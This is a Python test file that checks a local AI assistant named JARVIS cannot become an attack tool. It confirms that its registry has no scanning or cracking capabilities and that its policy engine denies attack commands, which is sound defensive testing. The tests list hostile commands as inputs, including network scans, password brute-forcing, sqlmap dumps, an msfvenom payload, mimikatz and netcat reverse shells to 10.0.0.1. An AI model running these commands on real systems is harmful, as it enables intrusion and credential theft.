"""Spec: 'JARVIS must not become an attack tool.' Two independent checks:
(1) no network-scanner/credential-cracker/exploit-runner CAPABILITY exists
anywhere in the tool registry itself, and (2) even via the general-purpose
execute_command escape hatch, invoking a real attack tool binary is denied
outright -- not merely gated as a DESTRUCTIVE action requiring approval,
which is a weaker guarantee than "must not exist".
"""
from __future__ import annotations

from jarvis.security.command_validator import classify_command
from jarvis.security.permissions import ActionRequest, Decision, PermissionLevel


# ============================================================================
# No such capability exists in the registry at all.
# ============================================================================

_FORBIDDEN_CAPABILITY_SUBSTRINGS = (
    "scan_network", "scan_port", "port_scan", "network_scan",
    "crack_password", "crack_credential", "brute_force", "bruteforce",
    "run_exploit", "exploit", "launch_malware", "malware",
    "ddos", "flood", "packet_inject", "arp_spoof", "arp_poison",
    "remote_login_attack", "mass_connect", "reverse_shell", "bind_shell",
    "wifi_attack", "harvest_credential", "credential_harvest",
    "raw_socket", "arbitrary_tcp", "arbitrary_udp", "connect_to",
    "execute_network_command",
)


def test_no_attack_tool_capability_exists_in_registry(registry):
    offenders = []
    for tool in registry.all():
        lowered = tool.name.lower()
        for forbidden in _FORBIDDEN_CAPABILITY_SUBSTRINGS:
            if forbidden in lowered:
                offenders.append((tool.name, forbidden))
    assert not offenders, f"attack-tool-shaped capabilities exist in the registry: {offenders}"


def test_no_tool_declares_raw_network_access(registry):
    # Every tool's description is short and human-written; a raw-socket or
    # arbitrary-destination capability would have to say so.
    for tool in registry.all():
        desc = tool.description.lower()
        assert "raw socket" not in desc
        assert "arbitrary host" not in desc
        assert "any port" not in desc


# ============================================================================
# execute_command: real attack-tool invocations must be denied outright,
# not merely gated as DESTRUCTIVE-requires-approval.
# ============================================================================

_ATTACK_COMMANDS = [
    "nmap -sV 192.168.1.0/24",
    "nmap -p 1-65535 192.168.1.1",
    "masscan -p1-65535 10.0.0.0/8",
    "zmap -p 443 0.0.0.0/0",
    "hydra -l admin -P rockyou.txt ssh://192.168.1.1",
    "medusa -h 192.168.1.1 -u admin -P pass.txt -M ssh",
    "sqlmap -u http://target.example.com/page?id=1 --dump",
    "msfconsole",
    "msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444",
    "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
    "john --wordlist=rockyou.txt hashes.txt",
    "aircrack-ng -w rockyou.txt capture.cap",
    "airodump-ng wlan0",
    "responder -I eth0",
    "mimikatz.exe",
    "crackmapexec smb 10.0.0.0/24 -u admin -p password",
    "evil-winrm -i 10.0.0.1 -u admin -p password",
    "bettercap -iface eth0",
    "wpscan --url http://target.example.com --enumerate u",
    "nikto -h http://target.example.com",
    "sharphound.exe -c All",
    "nc -lvp 4444 -e /bin/bash",
    "ncat --exec cmd.exe -l 4444",
]


def test_attack_tool_commands_are_denied_outright():
    failures = []
    for cmd in _ATTACK_COMMANDS:
        cls = classify_command(cmd)
        if not cls.denied:
            failures.append((cmd, cls.category.value))
    assert not failures, f"attack-tool commands were only gated, not denied outright: {failures}"


def test_attack_tool_commands_denied_via_full_policy_engine(policy_engine, settings):
    project = settings.indexed_roots[0]
    for cmd in _ATTACK_COMMANDS[:8]:  # representative sample through the real engine
        decision = policy_engine.evaluate(ActionRequest(
            tool_name="execute_command", command=cmd, cwd=project, paths=[project],
        ))
        assert decision.decision == Decision.DENY, f"{cmd!r} was not denied by the policy engine (got {decision.decision})"


def test_legitimate_dev_commands_are_not_caught_by_attack_patterns():
    # Precision check: the attack-tool patterns must not false-positive on
    # ordinary development commands, including ones that share substrings
    # with attack tool names (e.g. a person or file named "john").
    benign = [
        "git status", "pip install requests", "npm install express",
        "docker ps", "node server.js", "cat john_notes.txt",
        "ls -la /home/john", "python train.py --epochs 10",
        "echo 'responder pattern matched' > log.txt",
    ]
    for cmd in benign:
        cls = classify_command(cmd)
        assert not cls.denied, f"legitimate command {cmd!r} was incorrectly denied"


# ============================================================================
# Section 38's exact adversarial phrases, mapped to the concrete tool call
# they'd have to become.
# ============================================================================

def test_phrase_expose_jarvis_to_the_internet(settings):
    # No such capability exists: JARVIS has no server/listener of any kind
    # in this codebase to expose. Structural check, not a policy check.
    import jarvis.ui.app as app_module
    import inspect
    source = inspect.getsource(app_module)
    assert "0.0.0.0" not in source
    assert "bind(" not in source.lower()


def test_phrase_open_port_8080_for_me(policy_engine, settings):
    project = settings.indexed_roots[0]
    decision = policy_engine.evaluate(ActionRequest(
        tool_name="execute_command", command="netsh advfirewall firewall add rule name=open8080 dir=in action=allow protocol=TCP localport=8080",
        cwd=project, paths=[project],
    ))
    # Not on the absolute deny list specifically, but a firewall/system-
    # config change is DESTRUCTIVE-tier at minimum -- never silently ALLOW.
    assert decision.decision != Decision.ALLOW


def test_phrase_scan_my_local_network(policy_engine, settings):
    project = settings.indexed_roots[0]
    decision = policy_engine.evaluate(ActionRequest(tool_name="execute_command", command="nmap -sn 192.168.1.0/24", cwd=project, paths=[project]))
    assert decision.decision == Decision.DENY


def test_phrase_scan_192_168_1_0_24(policy_engine, settings):
    project = settings.indexed_roots[0]
    decision = policy_engine.evaluate(ActionRequest(tool_name="execute_command", command="nmap 192.168.1.0/24", cwd=project, paths=[project]))
    assert decision.decision == Decision.DENY


def test_phrase_connect_to_this_ip_and_test_its_ports(policy_engine, settings):
    project = settings.indexed_roots[0]
    decision = policy_engine.evaluate(ActionRequest(tool_name="execute_command", command="nmap -p- 10.0.0.5", cwd=project, paths=[project]))
    assert decision.decision == Decision.DENY


def test_phrase_open_a_reverse_shell(policy_engine, settings):
    project = settings.indexed_roots[0]
    decision = policy_engine.evaluate(ActionRequest(tool_name="execute_command", command="nc -e /bin/sh 10.0.0.1 4444", cwd=project, paths=[project]))
    assert decision.decision == Decision.DENY


def test_phrase_run_this_repositorys_setup_script(registry):
    # No tool automatically executes a repo's setup/install script -- every
    # execution is a deliberate execute_command call the user/LLM must make
    # explicitly and which still goes through the full command pipeline.
    auto_exec_tools = [t for t in registry.all() if "setup" in t.name.lower() or "install_from_repo" in t.name.lower()]
    assert auto_exec_tools == []


def test_phrase_keep_making_requests_until_the_server_responds(settings, registry, policy_engine, sandbox, audit_log, memory):
    # This is the runaway-loop case, already bounded elsewhere -- confirm
    # it's still bounded here as an explicit spec-traceability entry.
    from jarvis.core.orchestrator import Orchestrator
    from jarvis.llm.ollama_client import ChatResponse, ToolCall
    from jarvis.security.permissions import ApprovalScope

    orch = Orchestrator(settings, registry, policy_engine, sandbox, audit_log, memory, approval_callback=lambda r, d: ApprovalScope.ONCE)
    orch.llm.is_available = lambda: True
    calls = {"n": 0}

    def never_stopping(messages, tools=None):
        calls["n"] += 1
        return ChatResponse(content="", tool_calls=[ToolCall(id=str(calls["n"]), name="get_memory_usage", arguments={})])

    orch.llm.chat = never_stopping
    events = list(orch.handle_message("keep trying until it works"))
    assert calls["n"] <= 10
    assert any(e.type == "error" for e in events)


# ============================================================================
# Positive tests: security must not make JARVIS useless for real work.
# ============================================================================

def test_legitimate_requests_still_work(policy_engine, settings):
    project = settings.indexed_roots[0]
    cases = [
        ActionRequest(tool_name="get_cpu_usage", args={}),
        ActionRequest(tool_name="search_projects", args={"query": "supply chain"}),
        ActionRequest(tool_name="get_git_status", paths=[project]),
        ActionRequest(tool_name="execute_command", command="git status", cwd=project, paths=[project]),
    ]
    for req in cases:
        decision = policy_engine.evaluate(req)
        assert decision.decision == Decision.ALLOW, f"{req.tool_name} should be a normal, always-allowed operation"
